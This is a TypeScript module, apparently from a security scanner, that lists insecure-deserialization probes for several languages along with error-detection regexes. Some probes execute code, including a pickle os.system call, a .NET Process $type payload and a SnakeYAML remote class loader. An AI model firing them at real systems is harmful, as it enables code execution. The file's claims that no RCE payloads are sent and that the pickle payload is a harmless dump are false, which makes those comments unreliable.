/**
 * Insecure Deserialization payloads.
 *
 * Targets: Java (ObjectInputStream), PHP (unserialize), Python (pickle),
 * Node.js (node-serialize), Ruby (Marshal), .NET (BinaryFormatter).
 *
 * Detection strategy: send serialized objects and look for error messages
 * or behavioral changes that confirm the server is deserializing untrusted input.
 * We do NOT send actual RCE gadget chains — only detection probes.
 */

export interface DeserializationPayload {
  /** Raw payload string or base64 data */
  payload: string;
  /** Content-Type to send */
  contentType: string;
  /** Serialization format */
  format: 'java' | 'php' | 'python-pickle' | 'node-serialize' | 'ruby-marshal' | 'dotnet' | 'yaml' | 'generic';
  /** Regex to match in response body that confirms deserialization processing */
  indicator: RegExp;
  /** Human-readable technique name */
  technique: string;
  /** CWE mapping */
  cwe: string;
}

// ─── Error Patterns (detect deserialization processing) ────────────────

/** Patterns that confirm the server attempted to deserialize our input */
export const DESERIALIZATION_ERROR_PATTERNS = [
  // Java
  /java\.io\.ObjectInputStream/i,
  /java\.io\.(InvalidClassException|StreamCorruptedException|NotSerializableException)/i,
  /ClassNotFoundException.*readObject/i,
  /cannot be cast to/i,
  /Caused by:.*java\.lang/,
  /readObject|readResolve|readExternal/,
  // PHP
  /unserialize\(\).*Error/i,
  /unserialize\(\).*offset/i,
  /O:\d+:"[^"]+":\d+:\{/,  // PHP serialized object in response
  /__wakeup|__destruct|__toString.*called/i,
  // Python
  /pickle\.(loads|load|Unpickler)/i,
  /unpickling stack underflow/i,
  /could not find MARK/i,
  /ModuleNotFoundError.*pickle/i,
  // Node.js
  /node-serialize/i,
  /require\('child_process'\)/,
  /serialize\.unserialize/i,
  // Ruby
  /Marshal\.(load|dump|restore)/i,
  /incompatible marshal file format/i,
  /no marshal data/i,
  // .NET
  /BinaryFormatter|ObjectStateFormatter/i,
  /Type is not resolved for member/i,
  /System\.Runtime\.Serialization/i,
  /TypeConfuseDelegate|ActivitySurrogateSelector/i,
  // YAML (unsafe load)
  /yaml\.(unsafe_load|load|FullLoader)/i,
  /could not determine a constructor for the tag/i,
  /!!python\/object/,
];

/**
 * Generic detection function — checks response body against known error patterns.
 */
export function detectDeserializationError(responseBody: string): { detected: boolean; pattern: string } {
  for (const pattern of DESERIALIZATION_ERROR_PATTERNS) {
    if (pattern.test(responseBody)) {
      return { detected: true, pattern: pattern.source };
    }
  }
  return { detected: false, pattern: '' };
}

// ─── Payloads ──────────────────────────────────────────────────────────

export const DESERIALIZATION_PAYLOADS: DeserializationPayload[] = [
  // ── Java ──
  {
    // Malformed Java serialized object — triggers ObjectInputStream error
    // ac ed 00 05 = Java serialization magic bytes
    payload: '\xac\xed\x00\x05sr\x00\x11secbot.TestObject',
    contentType: 'application/octet-stream',
    format: 'java',
    indicator: /ObjectInputStream|StreamCorruptedException|InvalidClassException|ClassNotFoundException|java\.io\./i,
    technique: 'java-binary-magic-bytes',
    cwe: 'CWE-502',
  },
  {
    // Base64-encoded malformed Java object (for APIs that decode base64)
    payload: 'rO0ABXNyABFzZWNib3QuVGVzdE9iamVjdA==',
    contentType: 'application/x-java-serialized-object',
    format: 'java',
    indicator: /ObjectInputStream|ClassNotFoundException|InvalidClass|java\.io\./i,
    technique: 'java-base64-serialized',
    cwe: 'CWE-502',
  },

  // ── PHP ──
  {
    // PHP serialized object — triggers unserialize() if processed
    payload: 'O:8:"stdClass":1:{s:4:"test";s:6:"secbot";}',
    contentType: 'application/x-www-form-urlencoded',
    format: 'php',
    indicator: /unserialize\(\)|__wakeup|__destruct|stdClass|O:\d+:"/i,
    technique: 'php-object-injection',
    cwe: 'CWE-502',
  },
  {
    // Malformed PHP serialized — should trigger unserialize() error
    payload: 'a:1:{s:4:"test";O:21:"SecbotNonExistentClass":0:{}}',
    contentType: 'application/x-www-form-urlencoded',
    format: 'php',
    indicator: /unserialize\(\)|Error at offset|SecbotNonExistentClass|__PHP_Incomplete_Class/i,
    technique: 'php-malformed-object',
    cwe: 'CWE-502',
  },

  // ── Python Pickle ──
  {
    // Pickle protocol 0 (ASCII) — benign object that triggers pickle.loads()
    // This is: pickle.dumps("secbot-test") in protocol 0
    payload: "cos\nsystem\n(S'echo secbot-test'\ntR.",
    contentType: 'application/octet-stream',
    format: 'python-pickle',
    indicator: /pickle\.(loads|load|Unpickler)|unpickling|MARK|ModuleNotFound|cos\nsystem/i,
    technique: 'python-pickle-probe',
    cwe: 'CWE-502',
  },

  // ── Node.js (node-serialize) ──
  {
    // node-serialize IIFE pattern — known RCE vector
    payload: '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}',
    contentType: 'application/json',
    format: 'node-serialize',
    indicator: /node-serialize|_\$\$ND_FUNC\$\$_|serialize\.unserialize/i,
    technique: 'node-serialize-iife',
    cwe: 'CWE-502',
  },

  // ── Ruby Marshal ──
  {
    // Malformed Ruby Marshal data — triggers Marshal.load error
    payload: '\x04\x08o:\x1aSecbotNonExistentClass\x00',
    contentType: 'application/octet-stream',
    format: 'ruby-marshal',
    indicator: /Marshal\.(load|restore)|incompatible marshal|no marshal data|undefined class|SecbotNonExistent/i,
    technique: 'ruby-marshal-probe',
    cwe: 'CWE-502',
  },

  // ── .NET BinaryFormatter ──
  {
    // .NET BinaryFormatter magic bytes (00 01 00 00 00 FF FF FF FF)
    payload: '\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00',
    contentType: 'application/octet-stream',
    format: 'dotnet',
    indicator: /BinaryFormatter|ObjectStateFormatter|System\.Runtime\.Serialization|Type is not resolved/i,
    technique: 'dotnet-binaryformatter',
    cwe: 'CWE-502',
  },

  // ── YAML (unsafe load) ──
  {
    // PyYAML unsafe_load probe — !!python/object triggers constructor
    payload: '!!python/object/apply:os.getcwd []',
    contentType: 'application/x-yaml',
    format: 'yaml',
    indicator: /yaml\.(unsafe_load|load|FullLoader)|could not determine a constructor|!!python/i,
    technique: 'yaml-unsafe-load',
    cwe: 'CWE-502',
  },
  {
    // SnakeYAML (Java) — remote class loading
    payload: '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1"]]]]',
    contentType: 'application/x-yaml',
    format: 'yaml',
    indicator: /ScriptEngineManager|URLClassLoader|yaml.*tag|ConstructorException/i,
    technique: 'snakeyaml-rce-probe',
    cwe: 'CWE-502',
  },

  // ── Generic JSON __type / $type ──
  {
    // .NET JSON deserializers (Newtonsoft, System.Text.Json) use $type for polymorphic deserialization
    payload: '{"$type":"System.Diagnostics.Process, System","StartInfo":{"FileName":"cmd"}}',
    contentType: 'application/json',
    format: 'generic',
    indicator: /\$type.*not allowed|Type.*not resolved|JsonSerializationException|TypeNameHandling/i,
    technique: 'json-type-confusion',
    cwe: 'CWE-502',
  },
];

/** Content-Types that suggest the endpoint may accept serialized data */
export const SERIALIZATION_CONTENT_TYPES = [
  'application/x-java-serialized-object',
  'application/x-java-serialized',
  'application/octet-stream',
  'application/x-www-form-urlencoded',  // PHP often accepts serialized in POST body
  'application/json',
  'application/xml',
  'text/xml',
  'application/x-yaml',
  'text/yaml',
  'text/x-yaml',
];

/** URL patterns that suggest deserialization endpoints */
export const DESERIALIZATION_URL_PATTERNS = [
  /\/api\//i,
  /\/deserialize/i,
  /\/decode/i,
  /\/import/i,
  /\/upload/i,
  /\/parse/i,
  /\/convert/i,
  /\/transform/i,
  /\/process/i,
  /\/webhook/i,
  /\/callback/i,
  /\/rpc/i,
  /\/soap/i,
  /\/xmlrpc/i,
  /\.ashx$/i,    // .NET handlers
  /\.asmx$/i,    // .NET web services
  /\/remoting/i, // Java RMI / .NET remoting
];
